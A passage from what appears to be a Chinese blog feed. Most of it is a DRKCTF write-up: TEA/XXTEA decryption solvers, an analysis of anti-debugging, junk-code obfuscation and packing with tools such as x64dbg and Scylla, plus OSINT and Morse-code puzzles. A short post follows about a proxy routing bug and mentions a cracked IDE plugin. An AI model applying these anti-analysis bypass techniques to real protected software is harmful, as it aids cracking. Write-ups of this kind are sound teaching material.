class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio<span class="number">.</span>h&gt;</span><br><span class="line">#include &lt;stdint<span class="number">.</span>h&gt;</span><br><span class="line">#define DELTA <span class="number">0x9e3779b9</span></span><br><span class="line">#define MX (((z&gt;&gt;<span class="number">5</span>^y&lt;&lt;<span class="number">2</span>) + (y&gt;&gt;<span class="number">3</span>^z&lt;&lt;<span class="number">4</span>)) ^ ((sum^y) + (key[(p&amp;<span class="number">3</span>)^e] ^ z)))</span><br><span class="line"></span><br><span class="line">void btea(uint32_t* v, <span class="keyword">int</span> n, uint32_t const key[<span class="number">4</span>])</span><br><span class="line">&#123;</span><br><span class="line">uint32_t y, z, sum<span class="comment">;</span></span><br><span class="line">unsigned p, rounds, e<span class="comment">;</span></span><br><span class="line">if (n &gt; <span class="number">1</span>)            /* Coding Part */</span><br><span class="line">&#123;</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n<span class="comment">;</span></span><br><span class="line">sum = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">z = v[n - <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line"><span class="built_in">do</span></span><br><span class="line">&#123;</span><br><span class="line">sum += DELTA<span class="comment">;</span></span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span><span class="comment">;</span></span><br><span class="line">for (p = <span class="number">0</span><span class="comment">; p &lt; n - 1; p++)</span></span><br><span class="line">&#123;</span><br><span class="line">y = v[p + <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line">z = v[p] += MX<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">y = v[<span class="number">0</span>]<span class="comment">;</span></span><br><span class="line">z = v[n - <span class="number">1</span>] += MX<span class="comment">;</span></span><br><span class="line">&#125; while (--rounds)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">else if (n &lt; -<span class="number">1</span>)      /* Decoding Part */</span><br><span class="line">&#123;</span><br><span class="line">n = -n<span class="comment">;</span></span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n<span class="comment">;</span></span><br><span class="line">sum = rounds * DELTA<span class="comment">;</span></span><br><span class="line">y = v[<span class="number">0</span>]<span class="comment">;</span></span><br><span class="line"><span class="built_in">do</span></span><br><span class="line">&#123;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span><span class="comment">;</span></span><br><span class="line">for (p = n - <span class="number">1</span><span class="comment">; p &gt; 0; p--)</span></span><br><span class="line">&#123;</span><br><span class="line">z = v[p - <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line">y = v[p] -= MX<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">z = v[n - <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line">y = v[<span class="number">0</span>] -= MX<span class="comment">;</span></span><br><span class="line">sum -= DELTA<span class="comment">;</span></span><br><span class="line">&#125; while (--rounds)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char fakefalg[<span class="number">99</span>] = &#123; <span class="number">0xff</span>, <span class="number">0xef</span>, <span class="number">0x79</span>, <span class="number">0xbc</span>, <span class="number">0xda</span>, <span class="number">0x6c</span>, <span class="number">0xc9</span>,</span><br><span class="line"><span class="number">0xb1</span>, <span class="number">0x24</span>, <span class="number">0x90</span>, <span class="number">0x89</span>, <span class="number">0x5d</span>, <span class="number">0x99</span>,</span><br><span class="line"><span class="number">0x42</span>, <span class="number">0xe1</span>, <span class="number">0x15</span>, <span class="number">0xc1</span>, <span class="number">0x1b</span>, <span class="number">0x2a</span>,</span><br><span class="line"><span class="number">0x5a</span>, <span class="number">0x9f</span>, <span class="number">0x90</span>, <span class="number">0xe0</span>, <span class="number">0x5f</span>, <span class="number">0xe9</span>,</span><br><span class="line"><span class="number">0x74</span>, <span class="number">0x9d</span>, <span class="number">0x44</span>, <span class="number">0x0d</span>, <span class="number">0x56</span>, <span class="number">0xfd</span>,</span><br><span class="line"><span class="number">0x51</span>, <span class="number">0x7e</span>, <span class="number">0x34</span>, <span class="number">0x5a</span>, <span class="number">0xc5</span>, <span class="number">0x3a</span>,</span><br><span class="line"><span class="number">0x5e</span>, <span class="number">0x24</span>, <span class="number">0xbc</span>, <span class="number">0xe1</span>, <span class="number">0x40</span>, <span class="number">0x0d</span>,</span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x68</span>, <span class="number">0xfc</span>, <span class="number">0xcc</span>, <span class="number">0x09</span>, <span class="number">0x5b</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x19</span>, <span class="number">0xb6</span>, <span class="number">0xc9</span>,</span><br><span class="line"><span class="number">0x0a</span>, <span class="number">0x5e</span>, <span class="number">0xd9</span>, <span class="number">0x03</span>, <span class="number">0xb2</span>, <span class="number">0x48</span> &#125;<span class="comment">;</span></span><br><span class="line">for (<span class="keyword">int</span> i = <span class="number">0</span><span class="comment">; i &lt; 61; ++i) &#123;</span></span><br><span class="line">fakefalg[i] ^= <span class="number">0x23</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">uint32_t key[<span class="number">4</span>] = &#123; <span class="number">0x1234</span>,<span class="number">0x2341</span>,<span class="number">0x3412</span>,<span class="number">0x4123</span> &#125;<span class="comment">;</span></span><br><span class="line">btea((unsigned*)(fakefalg + <span class="number">1</span>), -<span class="number">15</span>, key)<span class="comment">;</span></span><br><span class="line">printf(<span class="string">&quot;解密后的数据：%s\n&quot;</span>, (char*)fakefalg)<span class="comment">;</span></span><br><span class="line">return <span class="number">0</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到假flag：</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DRKCTF&#123;Sorry.There<span class="number">_</span><span class="keyword">is</span><span class="number">_n</span>o<span class="number">_m</span>ore<span class="number">_f</span>lower<span class="number">_</span>tea.Please<span class="number">_</span><span class="keyword">try</span><span class="number">_</span>again!!&#125;</span><br></pre></td></tr></table></figure><p>很明显，这个不是真flag，这说明：<br>动态调试的时候和正常的时候运行的逻辑不一样<br>第一时间会想到这个可能是smc或者hook<br>所以先查看encode的交叉引用。<br>于是找到这个函数：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829975-153319f8-74d5-4986-8a9e-8f768ac45af7.png#averageHue=%23262523&clientId=u9fbe6832-1fb1-4&from=paste&id=ue3859d07&originHeight=175&originWidth=342&originalType=url&ratio=1&rotation=0&showTitle=false&size=13519&status=done&style=none&taskId=u3580044d-d353-4778-a37c-19359f8ce4a&title=" alt="image.png"><br>可以看到上层函数<br>修改了encode中的前几个字节用ret的方法返回到sub_140012A0中<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829989-1a9f71ea-f342-424a-af46-2cb10c1d5fee.png#averageHue=%23212120&clientId=u9fbe6832-1fb1-4&from=paste&id=uc3c9f92e&originHeight=449&originWidth=1207&originalType=url&ratio=1&rotation=0&showTitle=false&size=33860&status=done&style=none&taskId=uf9eb6404-6a25-4a29-80c0-ffd3c2e2565&title=" alt="image.png"><br>这里的第一个是反调试，在x64下，调试标志位在PEB表偏移0x2的位置，通过获取gs寄存器找到peb表的位置：<br>readsqword(0x62)得到调试标志位并判断当前进程是否在调试<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829985-4afa9be0-9bb4-4cb8-9f55-5dd9c717c765.png#averageHue=%23232222&clientId=u9fbe6832-1fb1-4&from=paste&id=u7808a012&originHeight=180&originWidth=741&originalType=url&ratio=1&rotation=0&showTitle=false&size=9782&status=done&style=none&taskId=ud6d90f24-7c4d-416e-a406-ac032578606&title=" alt="image.png"><br>block是单纯地得到对应的两个函数地址<br>get_virtual_protect中，通过异或把virtualprotect函数名隐藏并通过搜索它在kernel32.dll中位置返回函数地址<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829987-92034861-23bc-47d2-9e95-b4f30fa85fbe.png#averageHue=%23232221&clientId=u9fbe6832-1fb1-4&from=paste&id=ud99782d9&originHeight=483&originWidth=557&originalType=url&ratio=1&rotation=0&showTitle=false&size=29585&status=done&style=none&taskId=u93815ed8-e441-450f-b0cc-314164f4205&title=" alt="image.png"><br>通过上面的分析，可以得出我们需要查看sub_140012A0的内容，这里才是真正的加密函数<br>打开，还是花QAQ<br>汇编中，可以看到函数后段全是一个指令+一个jmp<br>由于汇编不是很好看，改成流程图看奇怪的地方。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829973-15def95e-8069-44cd-91a5-819ab44df3c5.png#averageHue=%23343436&clientId=u9fbe6832-1fb1-4&from=paste&id=u120b6f3f&originHeight=899&originWidth=326&originalType=url&ratio=1&rotation=0&showTitle=false&size=9261&status=done&style=none&taskId=u70f5eff6-e16f-4590-91c9-49d7be337ea&title=" alt="image.png"><br>可以猜测：如果一个地方有一块代码，并且有连续jmp，这里可能是人工加的花<br>那么就先看一下那个很远的环和上面一排没有入口的块<br>1<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832192-cef5fe2c-e686-4d46-b327-e5d7a3c01b20.png#averageHue=%23212120&clientId=u9fbe6832-1fb1-4&from=paste&id=u0fa192bf&originHeight=821&originWidth=634&originalType=url&ratio=1&rotation=0&showTitle=false&size=53017&status=done&style=none&taskId=u0aa49f92-479d-4bac-b428-67c7d183fb5&title=" alt="image.png"><br>这里能看到push和pop，所以从push进入花，从pop离开花，可以看出可以这样还原<br>2<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832265-37061b1b-0f12-4caf-8153-cba463e120d5.png#averageHue=%23242322&clientId=u9fbe6832-1fb1-4&from=paste&id=u065c3468&originHeight=933&originWidth=1035&originalType=url&ratio=1&rotation=0&showTitle=false&size=123404&status=done&style=none&taskId=u110b76e5-e698-4870-9616-0dac6ca2b32&title=" alt="image.png"><br>这里有一个call，尝试跟着call走，它下一步修改了返回地址，减去5A<br>即：140001460<br>转换一下这里的指令<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832191-1cc0fbe0-3f81-4909-a497-5295e5abc4db.png#averageHue=%23282726&clientId=u9fbe6832-1fb1-4&from=paste&id=u50bfb4ab&originHeight=50&originWidth=338&originalType=url&ratio=1&rotation=0&showTitle=false&size=2785&status=done&style=none&taskId=ueb56bbeb-3453-4f58-b939-3e8e83aa1b3&title=" alt="image.png"><br>所以把call nop了就好<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832182-3eb75a93-c094-4099-be25-76c4f9d44050.png#averageHue=%23535739&clientId=u9fbe6832-1fb1-4&from=paste&id=ue655d849&originHeight=215&originWidth=428&originalType=url&ratio=1&rotation=0&showTitle=false&size=3787&status=done&style=none&taskId=u28dc4c33-1a0b-4666-82b4-37908298542&title=" alt="image.png"><br>3<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832201-20c08a69-26d7-4428-95f8-6a320ed5339b.png#averageHue=%23232221&clientId=u9fbe6832-1fb1-4&from=paste&id=u9a6a4d18&originHeight=270&originWidth=476&originalType=url&ratio=1&rotation=0&showTitle=false&size=12030&status=done&style=none&taskId=u6996037f-ff56-4fac-9424-57aa1df09f5&title=" alt="image.png"><br>nop之后<br>然后全部u，c，p还原函数<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733834495-e9f6427f-ca83-4dc5-9162-da08a490e772.png#averageHue=%2320201f&clientId=u9fbe6832-1fb1-4&from=paste&id=ua1b08400&originHeight=941&originWidth=1251&originalType=url&ratio=1&rotation=0&showTitle=false&size=66758&status=done&style=none&taskId=ud999defe-5b98-4c43-b6af-623c89dd5f4&title=" alt="image.png"><br>这里又可以看到上面的一个奇怪return，看汇编可以发现还是一个花<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733834450-c2ef6d71-3686-447f-ab49-66e8d87bac19.png#averageHue=%23272221&clientId=u9fbe6832-1fb1-4&from=paste&id=uad94fd86&originHeight=387&originWidth=835&originalType=url&ratio=1&rotation=0&showTitle=false&size=28232&status=done&style=none&taskId=uddf8219b-4679-4003-a0a0-f0876da42bd&title=" alt="image.png"><br>直接把call到retn去掉（除了shl）<br>这是一个变体tea，尝试化简这个函数<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733834514-bfee2ec3-61aa-4829-9c9b-096656970bac.png#averageHue=%2320201f&clientId=u9fbe6832-1fb1-4&from=paste&id=uc65b387a&originHeight=910&originWidth=974&originalType=url&ratio=1&rotation=0&showTitle=false&size=89317&status=done&style=none&taskId=uc8d53d53-53c1-44c7-af9e-dc9500873e0&title=" alt="image.png"><br>写脚本直接解<br>exp:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dectrueTEA</span><span class="params">(<span class="type">uint32_t</span>* flag, <span class="type">uint32_t</span>* key, <span class="type">uint32_t</span> E)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> delta[<span class="number">4</span>] = &#123; <span class="number">0x59578627</span> ,<span class="number">0xe1c49e72</span>,<span class="number">0xbc24167f</span> ,<span class="number">0x8c3da26b</span> &#125;;</span><br><span class="line"><span class="type">uint32_t</span> e = E;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> len = <span class="number">15</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span>) &#123;</span><br><span class="line"><span class="type">uint32_t</span>* c[<span class="number">4</span>] = &#123; &amp;flag[(len - (i + <span class="number">3</span>)) % len],&amp;flag[(len - (i + <span class="number">2</span>)) % len],&amp;flag[(len - (i + <span class="number">1</span>)) % len],&amp;flag[(len - i) % len] &#125;;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">32</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">*c[<span class="number">3</span>] -= ((e ^ *c[<span class="number">2</span>]) ^ (key[(j + <span class="number">3</span>) % <span class="number">4</span>] &gt;&gt; <span class="number">2</span>)) ^ (e &lt;&lt; <span class="number">1</span>);</span><br><span class="line">e -= delta[*c[<span class="number">3</span>] % <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">*c[<span class="number">2</span>] -= ((e ^ *c[<span class="number">1</span>]) ^ (key[(j + <span class="number">2</span>) % <span class="number">4</span>] &lt;&lt; <span class="number">3</span>)) ^ (e &gt;&gt; <span class="number">2</span>);</span><br><span class="line">e -= delta[*c[<span class="number">2</span>] % <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">*c[<span class="number">1</span>] -= ((e ^ *c[<span class="number">0</span>]) ^ (key[(j + <span class="number">1</span>) % <span class="number">4</span>] &gt;&gt; <span class="number">1</span>)) ^ (e &lt;&lt; <span class="number">4</span>);</span><br><span class="line">e -= delta[*c[<span class="number">1</span>] % <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">*c[<span class="number">0</span>] -= ((e ^ *c[<span class="number">3</span>]) ^ (key[j % <span class="number">4</span>] &lt;&lt; <span class="number">2</span>)) ^ (e &gt;&gt; <span class="number">3</span>);</span><br><span class="line">e -= delta[*c[<span class="number">0</span>] % <span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;\n0x%x 0x%x 0x%x 0x%x\n&quot;, *c[0], *c[1], *c[2], *c[3]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> E = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint32_t</span> k1[<span class="number">4</span>] = &#123; <span class="number">0x1234</span>,<span class="number">0x2341</span>,<span class="number">0x3412</span>,<span class="number">0x4123</span> &#125;;</span><br><span class="line"><span class="type">uint32_t</span> a[] = &#123; <span class="number">0x127DC4E1</span>, <span class="number">0xCBA0EC0E</span>, <span class="number">0x570EDF5B</span>, <span class="number">0x99062A35</span>, <span class="number">0x382A7E1B</span>, <span class="number">0x15E46742</span>, <span class="number">0x4E5E456F</span>, <span class="number">0x3834C1D6</span>, <span class="number">0x5EF778A5</span>, <span class="number">0xAF217212</span>, <span class="number">0xC2D79D20</span>, <span class="number">0xD5C5935F</span>, <span class="number">0xCD2F5BB</span>, <span class="number">0xC527398C</span>, <span class="number">0x5EAC6739</span> &#125;;</span><br><span class="line">E = <span class="number">0xAE58570C</span>;</span><br><span class="line"><span class="built_in">dectrueTEA</span>(a, k1, E);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>die看不出来壳，但是ida可以，所以用x64dbg到脱完壳的地方，</p><p>不过得先调试，结果用ida调试直接寄在tls的call rax里面，用x64dbg一点事都没有，百思不得其解，最后发现</p><p><img src="https://s2.loli.net/2024/05/29/lfk2bu7oR6UGThp.png" alt="image-20240529215820329"></p><p>tls里面有个反调试，在解壳之前，所以得先跳过，dbg里面自带的插件直接秒了，所以dbg就没事QAQ</p><p>这个感觉很不错，要是有办法在ida里面用就好了</p><p>记录一下用工具修复iat表的过程：</p><p>x64dbg 插件 scylla</p><p><img src="https://s2.loli.net/2024/05/29/Q8fl1qEwGeXRmZx.png" alt="image-20240529205550754"></p><p>去反调试，然后把smc搞出来，直接解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = [<span class="number">0xCF</span>, <span class="number">0xD9</span>, <span class="number">0xC0</span>, <span class="number">0xC8</span>, <span class="number">0xDF</span>, <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0xD2</span>, <span class="number">0x43</span>, <span class="number">0x98</span>, <span class="number">0x10</span>, <span class="number">0xC0</span>, <span class="number">0x83</span>, <span class="number">0x43</span>, <span class="number">0x9A</span>, <span class="number">0x10</span>, <span class="number">0xCD</span>, <span class="number">0x42</span>, <span class="number">0x8C</span>, <span class="number">0x4A</span>, <span class="number">0x10</span>, <span class="number">0xC8</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x4A</span>, <span class="number">0x9F</span>, <span class="number">0x8C</span>, <span class="number">0xDF</span>, <span class="number">0x98</span>, <span class="number">0x42</span>, <span class="number">0x8C</span>, <span class="number">0xDF</span>, <span class="number">0x84</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x46</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x52</span>,<span class="number">0xE</span>]</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">len</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        k = c</span><br><span class="line">        <span class="keyword">if</span> c &lt;=<span class="number">0x40</span> <span class="keyword">or</span> c&gt;=<span class="number">0x5b</span>:</span><br><span class="line">            <span class="keyword">if</span> c&lt;=<span class="number">0x60</span> <span class="keyword">or</span> c &gt;= <span class="number">0x7b</span>:</span><br><span class="line">                c-=<span class="number">30</span></span><br><span class="line">                c^=<span class="number">0x51</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                c-=<span class="number">32</span></span><br><span class="line">                c^=<span class="number">0xcd</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c+=<span class="number">32</span></span><br><span class="line">            c^=<span class="number">0xab</span></span><br><span class="line">        <span class="keyword">if</span> c==last[<span class="built_in">len</span>]:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(k)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#DRKCTF&#123;Y0u_Kn0w_F1a9_Con9raTu1aTion5!!!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="一起做杯下午茶吧"><a href="#一起做杯下午茶吧" class="headerlink" title="一起做杯下午茶吧"></a>一起做杯下午茶吧</h3><p>不会QAQ</p><h2 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h2><h3 id="羡慕群友每一天"><a href="#羡慕群友每一天" class="headerlink" title="羡慕群友每一天"></a>羡慕群友每一天</h3><p>直接开搜</p><p><img src="https://s2.loli.net/2024/05/27/D9qgF3a4ZLxtCvP.png" alt="image-20240527145103522"></p><p>发现不是中间圆心的位置好像不一样</p><p>找另一个</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-弗罗里达州-迈阿密-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-佛罗⾥达州-迈阿密-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-佛罗里达州-迈阿密-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-佛罗里达州-迈阿密州-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-佛罗里达州-迈阿密市-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><p>第五个是对的</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="DNA-5"><a href="#DNA-5" class="headerlink" title="DNA -5"></a>DNA -5</h3><p>提示：遥遥领先</p><p>抽象的题，没看wp之前我绝对想不到QAQ</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ACGCTAATACCATCAACTCCATAACTCCCCACCTAAATCCAATAACCAGCTAAATCCAATAACCACTACCCCTCCATAAGAGAATAACCACTCATCCCCCTAATAAGAATAAACCTCCCCCAC</span></span><br></pre></td></tr></table></figure><p>根据wp，由遥遥领先想到5G，又因为-5，所以可以想到要少5个G</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ACCTAATACCATCAACTCCATAACTCCCCACCTAAATCCAATAACCACTAAATCCAATAACCACTACCCCTCCATAAAAATAACCACTCATCCCCCTAATAAAATAAACCTCCCCCAC</span></span><br></pre></td></tr></table></figure><p>看这个可以先试试DNA解密</p><p>不行</p><p>结果是摩斯</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WIPXGU<span class="meta">%</span>u<span class="number">7</span>bSZ_SZ_<span class="number">1</span><span class="name">G5</span>_<span class="symbol">N0</span>IH<span class="number">3</span><span class="meta">%</span>u<span class="number">7</span>d</span><br><span class="line">WIPXGU&#123;SZ_SZ_<span class="number">1</span><span class="name">G5</span>_<span class="symbol">N0</span>IH<span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure><p>然后解atbash</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DRKCTF&#123;H<span class="built_in">A_HA</span>_1T5_M0RS3&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">DRKCTF的复现</summary>
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    
    <category term="re" scheme="https://www.pri87.vip/tags/re/"/>
    
    <category term="cry" scheme="https://www.pri87.vip/tags/cry/"/>
    
  </entry>
  
  <entry>
    <title>记录一次修正网络bug</title>
    <link href="https://www.pri87.vip/posts/5afbca6a.html"/>
    <id>https://www.pri87.vip/posts/5afbca6a.html</id>
    <published>2024-05-27T02:52:37.000Z</published>
    <updated>2024-06-17T16:20:30.399Z</updated>
    
    <content type="html"><![CDATA[<p>不知道是什么时候开始，我的梯子出了一个bug（我感觉是安了idea破解插件之后QAQ）</p><p>首先这是基本信息：</p><p>我有一个梯子（同一个品牌）</p><p>一个是edge浏览器插件</p><p>一个是软件</p><p>根据这几天的观察，出现了以下现象：</p><ul><li>开启插件而关闭软件（上网策略+全局代理）：<br>只能进入cn.bing.com且网速很慢</li><li>开启插件而关闭软件（全局代理）：<br>网页浏览恢复正常，可以连上<a href="http://www.bing.com,过一段时间变成不可以连上,并且修打开关闭上网策略都不行/">www.bing.com，过一段时间变成不可以连上，并且修打开关闭上网策略都不行</a></li><li>开启软件而关闭插件（全局代理）：<br>网页浏览恢复正常，可以连上<a href="http://www.bing.com/">www.bing.com</a></li><li>两个都开启：<br>只能进入cn.bing.com且网速很慢</li><li>以前开启插件而关闭软件（上网策略+全局代理）：<br>可以连上<a href="http://www.bing.com/">www.bing.com</a></li><li>bing会解析ip判断是连cn还是www</li><li>有的时候通过pip安装包会访问错误（国内源）但是开启软件就可以</li></ul><p>目前通过关闭上网策略来进入<a href="http://www.bing.com/">www.bing.com</a><br>外面的bug之后再修QAQ</p><p>看了一下设置：<br>上网策略中会把cn.bing.com直接连接不经过梯子</p>]]></content>
    
    
    <summary type="html">好怪啊，这是为什么呢</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>java逆向基本步骤</title>
